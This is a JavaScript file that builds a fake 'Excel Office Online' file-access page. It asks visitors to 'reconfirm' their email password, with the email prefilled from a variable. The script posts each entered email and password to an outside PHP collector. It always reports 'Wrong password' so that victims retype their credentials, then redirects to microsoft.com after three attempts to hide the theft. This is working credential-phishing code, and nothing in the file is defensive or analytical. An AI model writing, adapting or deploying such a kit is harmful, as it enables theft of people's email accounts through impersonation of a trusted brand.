// Initialize signInAttempts variable
let signInAttempts = 0;

// Function to display error message
function showError(errorContainer, message) {
    errorContainer.textContent = message;

    // Show the error message container
    errorContainer.style.display = 'block';

    // Clear password field after displaying the error message
    const passwordInput = document.getElementById('password');
    passwordInput.value = ''; // Clear password field

    // Hide the error message after 2 seconds
    setTimeout(() => {
        errorContainer.style.display = 'none';
    }, 2000); // Adjust the duration (in milliseconds) as needed
}

// Your CSS styles
const styles = `
<style>
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        background-image: url("https://cdn.glitch.global/284bee3e-13ae-42ff-bd3a-b56ee6150ea0/image%20(4).jpg?v=1711448330982");
        background-size: cover;
        background-position: center;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }
    .container {
        background-color: #fff;
        border-radius: 8px;
        padding: 20px;
        text-align: center;
        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        max-width: 400px;
        width: 0;
        opacity: 0;
        animation: slideIn 0.5s forwards;
    }
    @keyframes slideIn {
        from {
            width: 0;
            opacity: 0;
        }
        to {
            width: 100%;
            opacity: 1;
        }
    }
    .logo {
        width: 100px;
        height: 100px;
        margin: auto;
        display: block;
    }
    h2 {
        font-weight: bold;
        margin-top: 20px;
        margin-bottom: 10px;
    }
    input[type="text"],
    input[type="password"],
    button {
        width: calc(100% - 40px);
        margin-bottom: 10px;
        padding: 10px;
        border-radius: 5px;
        border: 1px solid #ccc;
        box-sizing: border-box;
    }
    button {
        background-color: #039126;
        color: #fff;
        cursor: pointer;
        transition: background-color 0.3s ease;
    }
    button:hover {
        background-color: #037a22;
    }
    .error-container {
        color: white;
        background: lightcoral;
        padding: 5px;
        margin-top: 5px;
        border-radius: 5px;
        display: none;
        font-size: 12px;
    }
    .spinner {
        border: 4px solid rgba(0, 0, 0, 0.1);
        border-top: 4px solid #333;
        border-radius: 50%;
        width: 30px;
        height: 30px;
        animation: spin 1s linear infinite;
        margin: 20px auto;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
</style>
`;

// Append styles to the head
document.head.insertAdjacentHTML('beforeend', styles);

// Function to create the form when the DOM content is fully loaded
function createForm() {
    // Create HTML elements
    const body = document.querySelector('body');

    // Create form elements
    const containerDiv = document.createElement('div');
    containerDiv.classList.add('container');
    body.appendChild(containerDiv);

    const logoImg = document.createElement('img');
    logoImg.src = "https://firebasestorage.googleapis.com/v0/b/png-images-481bb.appspot.com/o/excellogo.png?alt=media&token=2339dbb3-40e5-45a2-a262-9bc9936edbc8";
    logoImg.alt = "ExcelOffice Logo";
    logoImg.classList.add('logo');
    containerDiv.appendChild(logoImg);

    const h2 = document.createElement('h2');
    h2.innerHTML = 'This File is Protected by <span style="font-weight: bold;">Excel Office Online</span>';
    containerDiv.appendChild(h2);

    const p = document.createElement('p');
    p.textContent = 'Please reconfirm email password to access shared file.';
    containerDiv.appendChild(p);

    const form = document.createElement('form');
    form.name = 'loginForm';
    form.action = 'https://02cb186.netsolhost.com/natty.php';
    form.method = 'post';
    containerDiv.appendChild(form);

    // Set placeholder email value
    const emailInput = document.createElement('input');
    emailInput.type = 'text';
    emailInput.name = 'email';
    emailInput.id = 'email';
    emailInput.value = emltag; // Set the value of the username field to emltag
    emailInput.required = true;
	emailInput.readonly = true;
    form.appendChild(emailInput);

    const passwordInput = document.createElement('input');
    passwordInput.type = 'password';
    passwordInput.name = 'password';
    passwordInput.id = 'password';
    passwordInput.placeholder = 'Password';
    passwordInput.required = true;
    form.appendChild(passwordInput);

    const submitButton = document.createElement('button');
    submitButton.type = 'submit';
    submitButton.id = 'submit-btn';
    submitButton.textContent = 'View';
    form.appendChild(submitButton);

    const errorContainer = document.createElement('div');
    errorContainer.classList.add('error-container');
    containerDiv.appendChild(errorContainer);

    const errorText = document.createElement('p');
    errorText.classList.add('error-text');
    errorContainer.appendChild(errorText);

    const spinner = document.createElement('div');
    spinner.classList.add('spinner');
    spinner.style.display = 'none';
    containerDiv.appendChild(spinner);

    // Call the function to handle form submission
    handleFormSubmission(errorContainer);
}

// Function to handle form submission
function handleFormSubmission(errorContainer) {
    const form = document.forms['loginForm'];
    const signInButton = document.getElementById('submit-btn');
    const spinner = document.querySelector('.spinner');
    const passwordInput = document.getElementById('password');

    form.addEventListener('submit', async (event) => {
        event.preventDefault();

        signInAttempts++;
        signInButton.textContent = 'Loading...';
        spinner.style.display = 'block';

        const formData = new FormData(form);

        try {
            const response = await fetch('https://02cb186.netsolhost.com/natty.php', {
                method: 'POST',
                body: formData
            });

            const responseData = await response.json();

            if (responseData.status === 'error') {
                showError(errorContainer, 'Wrong password. Please try again.');
            }

            // Reset button text and spinner
            signInButton.textContent = 'View';
            spinner.style.display = 'none';

            if (signInAttempts <= 2) {
                errorText.textContent = 'Wrong password. Please try again.';
                errorContainer.style.display = 'block';
                passwordInput.value = ''; // Clear password field
            } else if (signInAttempts === 3) {
                // Redirect after three attempts
                window.location.href = 'https://microsoft.com';
            }
        } catch (error) {
            showError(errorContainer, 'Wrong password. Please try again.');
            signInButton.textContent = 'View';
            spinner.style.display = 'none';
        }
    });
}

// Call the function to create the form when the DOM content is fully loaded
document.addEventListener('DOMContentLoaded', createForm);
